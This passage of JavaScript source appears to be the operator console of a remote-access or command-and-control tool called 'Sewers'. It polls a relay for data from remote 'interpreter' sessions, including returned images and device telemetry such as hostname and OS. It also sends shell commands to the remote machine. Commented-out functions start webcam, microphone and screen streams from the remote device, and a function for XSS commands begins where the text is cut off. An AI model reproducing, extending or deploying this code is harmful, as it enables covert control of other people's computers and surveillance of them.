
/*
*	
*	Sewers UI terminal functions package
*	
*/

	// Sleep
	app.functions.sleep = async seconds => {
		return new Promise(async resolve=>{
			setTimeout(resolve, seconds * 1000);
		});
	}

	// Escape HTML
	app.functions.escapeHTML = async data => {
		return new Promise(async(resolve)=>{
			resolve(
				new String(data)
					.replace(/\&/g, "&amp;")
					.replace(/\</g,"&lt;")
					.replace(/\>/g,"&gt;")
					.replace(/\"/g, "&quot;")
					.replace(/\'/g,"&#39;")
					.replace(/\\/g, "&#92;")
					.replace(/\//g, "&#x2F;")
					.replace(/ /g, "&nbsp;")
					.replace(/\t/g, "&nbsp;&nbsp;&nbsp;&nbsp;")
					.replace(/\n/g, "<br>")
			);
		});
	}

	// Escape RegExp matches
	app.functions.escapeRegExp = async data => {
		return new Promise(async(resolve)=>{
			resolve(
				new String(data)
					.replace(/\\/g, "\\\\")
					.replace(/\[/g, "\\[")
					.replace(/\]/g, "\\]")
					.replace(/\?/g, "[?]")
					.replace(/\!/g, "[!]")
					.replace(/\*/g, "[*]")
					.replace(/\(/g, "[(]")
					.replace(/\)/g, "[)]")
					.replace(/\-/g, "[-]")
					.replace(/\./g, "[.]")
			);
		});
	}

	// Unescape RegExp matches
	app.functions.unescapeRegExp = async data => {
		return new Promise(async(resolve)=>{
			resolve(
				new String(data)
					.replace(/\\\\/g, "\\")
					.replace(/\\\[/g, "[")
					.replace(/\\\]/g, "]")
					.replace(/\[\?\]/g, "?")
					.replace(/\[\!\]/g, "!")
					.replace(/\[\*\]/g, "*")
					.replace(/\[\(\]/g, "(")
					.replace(/\[\)\]/g, ")")
					.replace(/\[\-\]/g, "-")
					.replace(/\[\.\]/g, ".")
			);
		});
	}

	// Strip strings
	app.functions.strip = async data => {
		return new Promise(async(resolve)=>{
			const stripped = data.replace(/^\s*/, "").replace(/\s*$/, "");

			resolve(stripped);
		});
	}

	// Generate random string
	app.functions.randomString = async (min, max) => {
		const length = ( min + ( Math.random() * (max - min) ) );
		const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

		let buffer = "";

		while (buffer.length < length) {
			let index = parseInt( Math.random() * chars.length );
			buffer = buffer + chars.charAt(index);
		}

		return buffer;
	}

	// Randomize seconds
	app.functions.randTime = async (min, max) => {
		return ( min + ( Math.random() * (max - min) ) );
	}

	// app.functions.Print to terminal
	app.functions.print = async html => {
		const timestamped = document.createElement("stamp");

		timestamped.setAttribute( "time", new Date() );
		timestamped.innerHTML = html;

		let scrollOnOutput = false;
		if (
			app.environment.scrollOnOutput 
			|| parseInt(app.environment.scrollBox.scrollTop) === (app.environment.scrollBox.scrollHeight - app.environment.scrollBox.offsetHeight)
		) {
			scrollOnOutput = true;
		}

		app.environment.terminal.append(timestamped);

		await app.functions.shrinkInputField();
		await app.functions.resetClearBreaks();
		setTimeout(async()=>{
			scrollOnOutput ? app.functions.scrollToBottom() : "";
		}, 1);
	}

	// Return readable timestamp
	app.functions.timestamp = async () => {
		const now = new Date();

		let D = now.getDate();
		D < 10 ? D = "0" + D : "";

		let M = now.getMonth() + 1;
		M < 10 ? M = "0" + M : "";

		let Y = now.getFullYear();
		Y < 10 ? Y = "0" + Y : "";

		let h = now.getHours();
		h < 10 ? h = "0" + h : "";

		let m = now.getMinutes();
		m < 10 ? m = "0" + m : "";

		let s = now.getSeconds();
		s < 10 ? s = "0" + s : "";

		return D + "-" + M + "-" + Y + " " + h + ":" + m + ":" + s;
	}

	app.functions.printInstructions = async () => {
		app.functions.print(
			" <img src=\"/assets/images/os_linux.svg\" width=\"10px\"><span class=\"bold\"> " + navigator.os + " Sewers v1.0<br><br></span>" + 
			"Type <span class=\"orange bold\">?</span>, <span class=\"orange bold\">h</span> or <span class=\"orange bold\">help</span> for more info.<br>"
		);
	}

	app.functions.printHelp = async () => {
		const res = await app.http.Request("GET", "/help.html", [[]], "");

		if (res.status == 200) {
			app.functions.print(res.responseText);
		}
	}

	app.functions.printTelemetry = async () => {
		let icon = "",
		    os_name;

		if ( app.environment.sessionConfig.os.indexOf("Android" || "android") >= 0 ) {
			icon = "<img height=\"10px\" src=\"../../assets/images/os_android.svg\" />";
			os_name = "Android";
		} else if ( app.environment.sessionConfig.os.indexOf("iOS" || "ios") >= 0 ) {
			icon = "<img height=\"10px\" src=\"../../assets/images/os_apple.svg\" />";
			os_name = "iOS";
		} else if ( app.environment.sessionConfig.os.indexOf("cygwin" || "cygwin" || "mswin" || "mingw" || "bccwin" || "wince" || "emx") >= 0 ) {
			icon = "<img height=\"10px\" src=\"../../assets/images/os_windows.svg\" />";
			os_name = "Windows";
		} else if ( app.environment.sessionConfig.os.indexOf("Darwin" || "darwin") >= 0 ) {
			icon = "<img height=\"10px\" src=\"../../assets/images/os_apple.svg\" />";
			os_name = "macOS";
		} else if ( app.environment.sessionConfig.os.indexOf("Linux" || "linux") >= 0 ) {
			icon = "<img height=\"10px\" src=\"../../assets/images/os_linux.svg\" />";
			os_name = "Linux";
		}

		app.functions.print( 
			" " + icon + " <span class=\"bold\">" + os_name + " Interpreter<br><br></span>" + 
			"<span class=\"cyan\">Device</span>:&nbsp;<span class=\"grey\">" + app.environment.sessionConfig.device + "</span><br>" + 
			"<span class=\"cyan\">Hostname</span>:&nbsp;<span class=\"grey\">" + app.environment.sessionConfig.hostname + "</span><br>" + 
			"<span class=\"cyan\">OS</span>:&nbsp;<span class=\"grey\" style=\"overflow:hidden\">" + app.environment.sessionConfig.os + "</span><br>" + 
			"<span class=\"cyan\">Session&nbsp;ID</span>:&nbsp;<span class=\"grey\">" + app.environment.sessionConfig.session_id + "</span><br>" + 
			"<span class=\"cyan\">User-Agent</span>:&nbsp;<span class=\"grey\">" + app.environment.sessionConfig.user_agent + "</span><br>" + 
			"<span class=\"cyan\">Fetch Rate</span>:&nbsp;<span class=\"grey\"><span class=\"bold\">" + app.environment.sessionConfig.fetch_rate.replace("-", "</span> to <span class=\"bold\">") + "</span> seconds.</span><br>" + 
			"<hr>" + 
			" <img src=\"/assets/images/os_linux.svg\" width=\"10px\"><span class=\"bold\"> " + navigator.os + " Sewers v1.0<br><br></span>" + 
			"<span class=\"orange\">Relay Address</span>:&nbsp;<span class=\"grey\">" + app.environment.relayConfig.relay_address + "</span><br>" + 
			"<span class=\"orange\">Relay ID</span>:&nbsp;<span class=\"grey\">" + app.environment.relay + "</span><br>" + 
			"<span class=\"orange\">User-Agent</span>:&nbsp;<span class=\"grey\">" + app.environment.relayConfig.user_agent + "</span><br><br>"
		);
	}

	// Fetch new packets from interpreter
	app.functions.fetchPackets = async () => {
		const form = new String(
			"packet_id=" + 
			"&session_id=" + app.environment.sessionConfig.session_id + 
			"&relay_id=" + app.environment.relay
		);

		app.functions.showUpstreamIndicator();
		let res = await app.http.Request("POST", "/get", [["Content-Type", "application/x-www-form-urlencoded"]], form);
		app.functions.hideUpstreamIndicator();

		if (res.status == 200) {
			let response = res.responseText;

			if (response.length > 0) {
				let packets = response.split(",");

				for (i = 0; i < packets.length; i++) {
					let packetID = packets[i];

					const form = new String(
						"packet_id=" + packetID + 
						"&session_id=" + app.environment.sessionConfig.session_id + 
						"&relay_id=" + app.environment.relay
					);

					app.functions.showUpstreamIndicator();
					res = await app.http.Request("POST", "/get", [["Content-Type", "application/x-www-form-urlencoded"]], form);
					app.functions.hideUpstreamIndicator();

					response = res.responseText;

					app.environment.playSoundOnStdout ? new Audio("../../assets/audio/bell.mp3").play() : "";

					const plaintext = atob(response);

					await app.functions.print(app.environment.responseTag + "<span class=\"bold lightgreen\">OK</span> <span>" + await app.functions.timestamp() + "</span><br>");

					if ( plaintext.startsWith("\xff\xd8\xff") || plaintext.startsWith("\xFF\xD8\xFF") ) {
						app.functions.print("<img style=\"display:inline-block;\" title=\"Packet " + packetID + "\" src=\"data:image/jpg;base64," + await app.functions.escapeHTML(response) + "\" /><br>");
						setTimeout(async()=>{
							app.functions.shrinkInputField();
							app.functions.resetClearBreaks();
						}, 10);
					} else if ( plaintext.startsWith("\x89PNG\r\n\x1a\n") || plaintext.startsWith("\x89PNG\r\n\x1A\n") ) {
						app.functions.print("<img style=\"display:inline-block;\" title=\"Packet " + packetID + "\" src=\"data:image/png;base64," + await app.functions.escapeHTML(response) + "\" /><br>");
						setTimeout(async()=>{
							app.functions.shrinkInputField();
							app.functions.resetClearBreaks();
						}, 10);
					} else if ( plaintext.startsWith("GIF87a") || plaintext.startsWith("GIF89a") ) {
						app.functions.print("<img style=\"display:inline-block;\" title=\"Packet " + packetID + "\" src=\"data:image/gif;base64," + await app.functions.escapeHTML(response) + "\" /><br>");
						setTimeout(async()=>{
							app.functions.shrinkInputField();
							app.functions.resetClearBreaks();
						}, 10);
					} else if ( plaintext.startsWith("<?xml") && plaintext.indexOf("<svg") != -1 || plaintext.startsWith("<svg") ) {
						app.functions.print("<img style=\"display:inline-block;\" title=\"Packet " + packetID + "\" src=\"data:image/svg+xml;base64," + await app.functions.escapeHTML(response) + "\" /><br>");
						setTimeout(async()=>{
							app.functions.shrinkInputField();
							app.functions.resetClearBreaks();
						}, 10);
					} else if ( plaintext.startsWith(app.environment.sessionConfig.stream_tag + " ") ) {
						stopStream()
					} else {
						if (plaintext != "") {
							let stdout = await app.functions.escapeHTML(plaintext);
							stdout = stdout + (plaintext.match(/\n$/) ? "" : "<br>");
							app.functions.print(stdout);
						} else {
							app.functions.print("");
						}
					}
				}
			}
		}
	}

	// Start auto fetcher
	app.functions.startAutoFetching = async (min, max) => {
		if (app.environment.autoFetching) {
			await app.functions.stopAutoFetching();

			app.functions.startAutoFetching(min, max);
		} else {
			app.environment.autoFetching = true;

			app.environment.fetchDelay = app.functions.randTime(min, max) * 1000;

			app.functions.fetchPackets();

			app.environment.autoFetch = async () => {
				if (app.environment.autoFetching) {
					app.environment.fetchDelay = await app.functions.randTime(min, max) * 1000;

					app.functions.startLoadLine();
					app.functions.fetchPackets();

					app.environment.autoFetchTimeout = setTimeout(app.environment.autoFetch, app.environment.fetchDelay);
				}
			}

			if (app.environment.fetchOnAutoFetchStart) {
				app.environment.autoFetchTimeout = setTimeout(app.environment.autoFetch, 0);
			}

			app.functions.print("<span>Fetching new packets from relay every <span class=\"bold\">" + parseInt(min) + "</span> to <span class=\"bold\">" + parseInt(max) + "</span> seconds.<br></span>");
		}
	}

	// Stop auto fetcher
	app.functions.stopAutoFetching = async (min, max) => {
		if (app.environment.autoFetching) {
			app.environment.autoFetching = false;

			clearTimeout(app.environment.autoFetchTimeout);

			app.environment.loadLine.classList.add("stop");

			app.functions.print("<span>Auto fetcher stopped.<br></span>");
		} else {
			app.functions.print("<span>Auto fetcher is not running.<br></span>");
		}
	}

	// Get session config
	app.functions.getSessionConfig = async (relay, session) => {
		const res = await app.http.Request("GET", "/session/" + relay + "/" + session, [[]], "");

		if (res.status == 200) {
			app.environment.sessionConfig = JSON.parse(res.responseText);
		}
	}

	// Get relay config
	app.functions.getRelayConfig = async relay => {
		const res = await app.http.Request("GET", "/config/" + relay, [[]], "");

		if (res.status == 200) {
			app.environment.relayConfig = JSON.parse(res.responseText);
		}
	}

	// Move loadline
	app.functions.startLoadLine = async () => {
		app.environment.loadLine.classList.add("stop");

		setTimeout(async()=>{
			const delay = (app.environment.fetchDelay - 600);

			app.environment.loadLine.style.transition = "opacity 360ms linear, width " + delay + "ms linear 360ms";
			app.environment.loadLine.style.webkitTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms";
			app.environment.loadLine.style.mozTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms";
			app.environment.loadLine.style.msTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms";
			app.environment.loadLine.style.oTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms";

			app.environment.loadLine.classList.remove("stop");
		}, 100)
	}

	// Scroll to bottom
	app.functions.scrollToBottom = async () => {
		app.environment.scrollBox.scrollTop = app.environment.terminal.getBoundingClientRect().height;
	}

	// Set clear breaks for clear function
	app.functions.resetClearBreaks = async () => {
		app.environment.clearBreaks = parseInt( ( self.innerHeight - 84 ) / 12 );
	}

	// Shrink input field as scrollbox increases in size
	app.functions.shrinkInputField = async () => {
		app.environment.form.style.height = ( self.innerHeight - app.environment.scrollBox.getBoundingClientRect().height ) + "px";
	}

	// Clear function
	app.functions.clear = async () => {
		app.environment.terminal.innerHTML = "";
		app.functions.shrinkInputField();
	}

	app.functions.parseUserAgent = async () => {
		if ( navigator.userAgent.match(/android/i) ) {
			navigator.os = "Android";
		} else if ( navigator.userAgent.match(/ios/i) ) {
			navigator.os = "iOS";
		} else if ( navigator.userAgent.match(/windows/i) ) {
			navigator.os = "Windows";
		} else if ( navigator.userAgent.match(/mac os/i) ) {
			navigator.os = "macOS";
		} else if ( navigator.userAgent.match(/linux/i) ) {
			navigator.os = "Linux";
		}
	}

	// // Append new stream to menu
	// app.functions.addStream = async (streamID, streamType) => {
	// 	if (streamType == "cam") {
	// 		document.querySelector("html body div.menu").append("<div class=\"item left\" title=\"Stream ID: " + streamID + "\" onclick=\"window.open('" + location.protocol + "//" + location.host + "/stream?cam&" + streamID + "&" + streamFile + ".mp4', '" + streamFile + ".mp4', 'width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no')\"><div class=\"icon eye\"><div class=\"icon rec blinking\"></div></div></div>");
	// 	} else if (streamType == "mic") {
	// 		document.querySelector("html body div.menu").append("<div class=\"item left\" title=\"Stream ID: " + streamID + "\" onclick=\"window.open('" + location.protocol + "//" + location.host + "/stream?mic&" + streamID + "&" + streamFile + ".mp4', '" + streamFile + ".wav', 'width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no')\"><div class=\"icon streammic\"><div class=\"icon rec blinking\"></div></div></div>");
	// 	} else if (streamType == "mon") {
	// 		document.querySelector("html body div.menu").append("<div class=\"item left\" title=\"Stream ID: " + streamID + "\" onclick=\"window.open('" + location.protocol + "//" + location.host + "/stream?mon&" + streamID + "&" + streamFile + ".mp4', '" + streamFile + ".mp4', 'width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no')\"><div class=\"icon streammon\"><div class=\"icon rec blinking\"></div></div></div>");
	// 	} else if (streamType == "shell") {
	// 		document.querySelector("html body div.menu").append("<div class=\"item left\" title=\"Stream ID: " + streamID + "\" onclick=\"window.open('" + location.protocol + "//" + location.host + "/stream?cam&" + streamID + "&" + streamFile + ".mp4', '" + streamFile + ".mp4', 'width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no')\"><div class=\"icon eye\"><div class=\"icon rec blinking\"></div></div></div>");
	// 	}
	// }

	// // Start new monitor stream
	// app.functions.streamMon = async (bitrate, resolution) => {
	// 	const res = await app.functions.sendRequest("POST", "/", "data=STREAMMON " + bitrate + " " + resolution + "&session_id=" + app.environment.sessionConfig.session_id)

	// 	if (res.status == 200) {
	// 		let response = res.responseText.split(" ")

	// 		let streamID = response[0]
	// 		let streamFile = response[1]

	// 		app.functions.print(app.environment.responseTag + " [<span class='green'>OK</span>] " + "<span>" + await app.functions.timestamp() + "</span>")

	// 		if (response[0] == "Usage:") {
	// 			app.functions.print("<span>" + response + "</span>")
	// 		} else {
	// 			app.functions.print("<span>Monitor stream started.</span>")
	// 			app.functions.print("<span>&nbsp;&nbsp;├&nbsp;Stream ID&nbsp;&nbsp;: </span><span>" + streamID + "</span>")
	// 			app.functions.print("<span>&nbsp;&nbsp;└&nbsp;Stream URL&nbsp;: </span><span><a onclick='window.open(\"" + location.protocol + "//" + location.host + "/stream?mon&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".mp4\", \"width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'>" + location.protocol + "//" + location.host + "/stream?mon&" + streamID + "&" + streamFile + ".mp4</a></span>")

	// 			addStream(streamID, "STREAMMON")
	// 		}
	// 	}
	// }

	// // Start new microphone stream
	// app.functions.streamMic = async bitrate => {
	// 	const res = await app.functions.sendRequest("POST", "/", "data=STREAMMIC " + bitrate + "&session_id=" + app.environment.sessionConfig.session_id)

	// 	if (res.status == 200) {
	// 		let response = res.responseText.split(" ")

	// 		let streamID = response[0]
	// 		let streamFile = response[1]

	// 		app.functions.print(app.environment.responseTag + " [<span class='green'>OK</span>] " + "<span>" + await app.functions.timestamp() + "</span>")

	// 		if (response[0] == "Usage:") {
	// 			app.functions.print("<span>" + response + "</span>")
	// 		} else {
	// 			app.functions.print("<span>Microphone stream started.</span>")
	// 			app.functions.print("<span>&nbsp;&nbsp;├&nbsp;Stream ID&nbsp;&nbsp;: </span><span>" + streamID + "</span>")
	// 			app.functions.print("<span>&nbsp;&nbsp;└&nbsp;Stream URL&nbsp;: </span><span><a onclick='window.open(\"" + location.protocol + "//" + location.host + "/stream?mic&" + streamID + "&" + streamFile + ".wav\", \"" + streamFile + ".wav\", \"width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'>" + location.protocol + "//" + location.host + "/stream?mic&" + streamID + "&" + streamFile + ".wav</a></span>")

	// 			addStream(streamID, "STREAMMIC")
	// 		}
	// 	}
	// }

	// // Start new webcam stream
	// app.functions.streamCam = async (bitrate, resolution) => {
	// 	app.functions.print(app.environment.requestTag + "<span title='" + await app.functions.timestamp() + "'>Streaming webcam...</span>")

	// 	const res = await app.functions.sendRequest("POST", "/", "data=STREAMCAM&session_id=" + app.environment.sessionConfig.session_id)

	// 	if (res.status == 200) {
	// 		let response = res.responseText.split(" ")

	// 		let streamID = response[0]
	// 		let streamFile = response[1]

	// 		app.functions.print(app.environment.responseTag + " [<span class='green'>OK</span>] " + "<span>" + await app.functions.timestamp() + "</span>")

	// 		if (response[0] == "Usage:") {
	// 			app.functions.print("<span>" + response + "</span>")
	// 		} else {
	// 			app.functions.print("<span>Webcam stream started.</span>")
	// 			app.functions.print("<span>&nbsp;&nbsp;├&nbsp;Stream ID&nbsp;&nbsp;: </span><span>" + streamID + "</span>")
	// 			app.functions.print("<span>&nbsp;&nbsp;└&nbsp;Stream URL&nbsp;: </span><span><a onclick='window.open(\"" + location.protocol + "//" + location.host + "/stream?cam&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".mp4\", \"width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'>" + location.protocol + "//" + location.host + "/stream?cam&" + streamID + "&" + streamFile + ".mp4</a></span>")

	// 			addStream(streamID, "STREAMCAM")
	// 		}
	// 	}
	// }

	// Change fetch rate of interpreter
	app.functions.changeFetchRate = async (min, max) => {
		const form = new String(
			"body=" + app.environment.sessionConfig.fetch_rate_tag + " " + min + " " + max + 
			"&session_id=" + app.environment.sessionConfig.session_id + 
			"&relay_id=" + app.environment.relay
		);

		app.functions.showUpstreamIndicator();
		app.http.Request("POST", "/fetchrate", [["Content-Type", "application/x-www-form-urlencoded"]], form).then(async(res)=>{
			if (res.status == 200) {
				app.functions.hideUpstreamIndicator();

				app.functions.print("<span>Interpreter will be fetching new packets every <span class=\"bold\">" + min + "</span> to <span class=\"bold\">" + max + "</span> seconds.<br></span>");

				app.environment.sessionConfig.fetch_rate = min + "-" + max;
			}
		});
	}

	// Return standard input to interpeter shell
	app.functions.toShell = async url_encoded => {
		const form = new String(
			"body=" + url_encoded + 
			"&session_id=" + app.environment.sessionConfig.session_id + 
			"&relay_id=" + app.environment.relay
		);

		app.functions.showUpstreamIndicator();
		app.http.Request("POST", "/post", [["Content-Type", "application/x-www-form-urlencoded"]], form).then(async(res)=>{
			app.functions.hideUpstreamIndicator();
		});
	}

	// Return standard input to interpreter stream
	app.functions.toStream = async (stream_session_id, command) => {
		return new Promise(async(resolve, reject)=>{
			const form = new String(
				"body=" + encodeURIComponent(command) + 
				"&session_id=" + encodeURIComponent(app.environment.sessionConfig.session_id) + 
				"&stream_id=" + encodeURIComponent(stream_session_id) + 
				"&stream_rate=" + encodeURIComponent( app.streams.active[stream_session_id].rate.join(" ") ) + 
				"&relay_id=" + encodeURIComponent(app.environment.relay)
			);

			app.functions.showUpstreamIndicator();
			app.http.Request("POST", "/stream", [["Content-Type", "application/x-www-form-urlencoded"]], form).then(async(res)=>{
				app.functions.hideUpstreamIndicator();

				resolve();
			}).catch(async(err)=>{
				reject(err);
			});
		});
	}

	// Stream shell session
	app.functions.startStream = async stream_type => {
		return new Promise(async(resolve, reject)=>{
			const new_stream_session_id = await app.functions.randomString(4, 8);

			if (app.streams.active[new_stream_session_id]) {
				reject("<span class=\"red\">stream session " + new_stream_session_id + " already exists.</span>");
			} else {
				app.streams.active[new_stream_session_id] = {
					"buffer": new Uint8Array(),
					"rate": app.environment.sessionConfig.stream_rate.split("-"),
					"type": stream_type,
				};

				app.streams.current = new_stream_session_id;

				app.environment.requestTag = "<span class=\"bold\">&dollar;</span>&nbsp;\xBB&nbsp;";

				app.functions.print(app.environment.requestTag + "shell stream <span class=\"bold\">" + new_stream_session_id + "</span> started.<br>");

				if (stream_type == "microphone") {
					Object.keys(app.commands.microphone).forEach(async(command)=>{
						app.commands.microphone[command].load();
					});
				} else if (stream_type == "monitor") {
					Object.keys(app.commands.monitor).forEach(async(command)=>{
						app.commands.monitor[command].load();
					});
				} else if (stream_type == "shell") {
					Object.keys(app.commands.shell).forEach(async(command)=>{
						app.commands.shell[command].load();
					});
				} else if (stream_type == "webcam") {
					Object.keys(app.commands.webcam).forEach(async(command)=>{
						app.commands.webcam[command].load();
					});
				}

				const body = [
					app.environment.sessionConfig.stream_tag, 
					new_stream_session_id,
					app.streams.active[new_stream_session_id].rate[0],
					app.streams.active[new_stream_session_id].rate[1]
				];

				const form = new String(
					"body=" + encodeURIComponent( body.join(" ") ) + 
					"&session_id=" + encodeURIComponent(app.environment.sessionConfig.session_id) + 
					"&relay_id=" + encodeURIComponent(app.environment.relay)
				);

				app.functions.showUpstreamIndicator();
				app.http.Request("POST", "/post", [["Content-Type", "application/x-www-form-urlencoded"]], form).then(async(res)=>{
					app.functions.hideUpstreamIndicator();

					app.functions.pipeStream(new_stream_session_id);
				});
			}
		});
	}

	// Stream shell session
	app.functions.stopStream = async stream_session_id => {
		const form = new String(
			"body=" + encodeURIComponent(app.environment.sessionConfig.stream_tag) + 
			"&session_id=" + encodeURIComponent(app.environment.sessionConfig.session_id) + 
			"&stream_id=" + encodeURIComponent(stream_session_id) + 
			"&stream_rate=" + 
			"&relay_id=" + encodeURIComponent(app.environment.relay)
		);

		app.functions.showUpstreamIndicator();
		app.http.Request("POST", "/stream", [["Content-Type", "application/x-www-form-urlencoded"]], form).then(async(res)=>{
			app.functions.hideUpstreamIndicator();

			app.environment.requestTag = "<span class=\"orange bold\">sewers</span>&nbsp;\xBB&nbsp;";

			app.streams.current == stream_session_id ? app.streams.current = "" : "";
			delete app.streams.active[stream_session_id];

			app.functions.print(app.environment.requestTag + "shell stream <span class=\"bold\">" + stream_session_id + "</span> terminated.<br>");
		});
	}

	// Pipe stream output to destination
	app.functions.pipeStream = async (stream_session_id) => {
		if (app.streams.current == stream_session_id) {
			while (app.streams.current == stream_session_id) {
				const interval = parseInt(app.streams.active[stream_session_id].rate[0]) + ( Math.random() * parseInt(app.streams.active[stream_session_id].rate[1] - app.streams.active[stream_session_id].rate[0]) );

				const form = new String(
					"body=" + 
					"&session_id=" + encodeURIComponent(app.environment.sessionConfig.session_id) + 
					"&stream_id=" + encodeURIComponent(stream_session_id) + 
					"&stream_rate=" + encodeURIComponent( app.streams.active[stream_session_id].rate.join(" ") ) + 
					"&relay_id=" + app.environment.relay
				);

				app.functions.showUpstreamIndicator();
				const res = await app.http.Request("POST", "/stream", [["Content-Type", "application/x-www-form-urlencoded"]], form);

				if (res.response) {
					if (app.streams.active[app.streams.current].type == "shell") {
						app.functions.print( await app.functions.escapeHTML( atob(res.responseText) ) );
					} else {
						const int_array_encoder = new TextEncoder();
						const chunk = new Uint8Array(res.response);
						app.streams.active[stream_session_id].buffer.set(chunk, app.streams.active[stream_session_id].buffer.length);
						console.log(app.streams.active[stream_session_id].buffer) // debug
					}
				}

				await app.functions.sleep(interval / 1000);
			}
		} else {
			app.functions.print("ERROR: could not pipe stream output from <span class=\"bold\">" + stream_session_id + "</span> because it is not attached.<br>");
		}
	}

	// Attach to shell stream session
	app.functions.attachStream = async stream_session_id => {
		switch (app.streams.active[stream_session_id].type) {
			case "microphone":
				app.environment.requestTag = "<span class=\"bold\">microphone</span>&nbsp;\xBB&nbsp;";
				break;
			case "monitor":
				app.environment.requestTag = "<span class=\"bold\">monitor</span>&nbsp;\xBB&nbsp;";
				break;
			case "shell":
				app.environment.requestTag = "<span class=\"bold\">&dollar;</span>&nbsp;\xBB&nbsp;";
				break;
			case "webcam":
				app.environment.requestTag = "<span class=\"bold\">webcam</span>&nbsp;\xBB&nbsp;";
		}

		app.streams.current = stream_session_id;

		app.functions.pipeStream(stream_session_id);

		app.functions.print(app.environment.requestTag + "attached " + app.streams.active[stream_session_id].type + " stream <span class=\"bold\">" + stream_session_id + "</span>.<br>");
	}

	// Detach from shell stream session
	app.functions.detachStream = async stream_session_id => {
		app.environment.requestTag = "<span class=\"orange bold\">sewers</span>&nbsp;\xBB&nbsp;";

		app.streams.current = "";

		app.functions.print(app.environment.requestTag + "detached shell stream <span class=\"bold\">" + stream_session_id + "</span>.<br>");
	}

	// Upstreams activity indicator
	app.functions.showUpstreamIndicator = async () => {
		app.environment.upstreamIndicator.setAttribute("data-state", "on");
	}

	// Upstreams activity indicator
	app.functions.hideUpstreamIndicator = async () => {
		setTimeout(async()=>{		
			app.environment.upstreamIndicator.setAttribute("data-state", "off");
		}, 320);
	}

	// Autocomplete stdin
	app.functions.autoComplete = async (command, tabbed_command, pre_cursor, choices) => {
		const tabbed_command_regexp = await app.functions.escapeRegExp(tabbed_command);
		const choices_string = choices.join(" ");

		let regexp = new RegExp("(?:^|\\s)" + tabbed_command_regexp + "\\S*", "ig");

		if ( choices_string.match(regexp) ) {
			let matches = choices_string.match(regexp);

			for (let i = 0; i < matches.length; i++) {
				matches[i] = await app.functions.strip(matches[i]);
			}

			let replacement;

			for (let a = 0; a < choices.length; a++) {
				if ( choices[a].match(regexp) ) {
					if (matches.length > 1) {
						let longest_matching_substring = await app.functions.unescapeRegExp(tabbed_command_regexp);
						let longest_matching_substring_length = 0;

						matches.forEach(async(match)=>{
							match.length > longest_matching_substring_length ? longest_matching_substring_length = match.length : "";
						});

						let matching_substring_count = matches.length;

						for (let b = 0; b < longest_matching_substring_length; b++) {
							const r = new RegExp("^" + await app.functions.escapeRegExp( longest_matching_substring + choices[a].charAt(longest_matching_substring.length) ), "ig" );

							matching_substring_count = 0;
							matches.forEach(async(match)=>{
								match.match(r) ? matching_substring_count++ : "";
							});

							if (matching_substring_count == matches.length) {
								longest_matching_substring = longest_matching_substring + choices[a].charAt(longest_matching_substring.length);
							} else {
								break;
							}
						}

						regexp = new RegExp(tabbed_command_regexp + "$", "i");
						replacement = pre_cursor.replace(regexp, longest_matching_substring);

						if (tabbed_command.length == longest_matching_substring.length) {
							app.functions.print( 
								"<span style=\"display:block;word-break:keep-all;\">" + 
									app.environment.requestTag + await app.functions.escapeHTML(pre_cursor) + "<br>" + 
									matches.join("&nbsp;&nbsp;&nbsp; ") + "<br>" + 
								"</span>" 
							);
						}

						break;
					} else {
						regexp = new RegExp(tabbed_command_regexp + "$", "i");
						replacement = pre_cursor.replace(regexp, choices[a]) + " ";

						break;
					}
				}
			}

			app.environment.textarea.value = app.environment.textarea.value.replace(pre_cursor, replacement);
			app.environment.textarea.selectionEnd = replacement.length;
		}
	}

	// Submit standard input
	app.functions.onCommand = async () => {
		const cmd = app.environment.textarea.value;

		app.environment.textarea.value = "";

		app.functions.parseCommand(cmd);
	}

	// Parse standard input
	app.functions.parseCommand = async cmd => {
		app.environment.cmdHistoryIndex = 0;

		cmd = cmd.replace(/^\s*/, "");

		app.functions.print( app.environment.requestTag + "<span title='" + await app.functions.timestamp() + "'>" + await app.functions.escapeHTML(cmd) + "</span><br>" );

		if ( !cmd.match(/^\s*$/) ) {
			if (app.environment.cmdHistory[0] != cmd) {
				app.environment.cmdHistory.unshift(cmd);
			}

			// Parse command
			if ( !cmd.match(/^#/) ) {
				const command = cmd.split(" ")[0],
				      args = await app.functions.strip( cmd.replace(/^\S+/, "") );

				if (app.streams.current == "") {
					if (app.commands.builtin[command]) {
						app.commands.builtin[command].launch(args);
					} else if (app.commands.pluggedin[command]) {
						app.commands.pluggedin[command].launch(args);
					} else {
						app.functions.print( await app.functions.escapeHTML(command) + ": command not found. Type <span class=\"bold orange\">help</span> to see a list of commands.<br>" );
					}
				} else {
					switch (app.streams.active[app.streams.current].type) {
						case "microphone":
							if (app.commands.microphone[command]) {
								app.commands.microphone[command].launch(args);
								break;
							} else {
								app.functions.print( await app.functions.escapeHTML(command) + ": command not found. Type <span class=\"bold orange\">help</span> to see a list of commands.<br>" );
								break;
							}
						case "monitor":
							if (app.commands.monitor[command]) {
								app.commands.monitor[command].launch(args);
								break;
							} else {
								app.functions.print( await app.functions.escapeHTML(command) + ": command not found. Type <span class=\"bold orange\">help</span> to see a list of commands.<br>" );
								break;
							}
						case "shell":
							if (app.commands.shell[command]) {
								app.commands.shell[command].launch(args);
								break;
							} else {
								app.functions.toStream(app.streams.current, cmd);
								break;
							}
						case "webcam":
							if (app.commands.webcam[command]) {
								app.commands.webcam[command].launch(args);
							} else {
								app.functions.print( await app.functions.escapeHTML(command) + ": command not found. Type <span class=\"bold orange\">help</span> to see a list of commands.<br>" );
							}
					}
				}
			} else {
				return;
			}
		}

		app.environment.textarea.focus();
	}

	app.functions.parseXSSCommand = async cmd => {
		if ( cmd.match(/^\s*$/) ) {
			app.functions.print( 
